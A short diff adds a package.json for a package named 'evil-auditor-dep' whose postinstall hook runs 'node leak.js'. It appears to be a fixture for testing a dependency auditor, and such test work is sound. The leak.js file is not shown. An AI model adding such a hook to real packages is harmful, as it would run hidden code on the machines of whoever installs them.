@@ -1,0 +1,7 @@
+{
+  "name": "evil-auditor-dep",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node leak.js"
+  }
+}
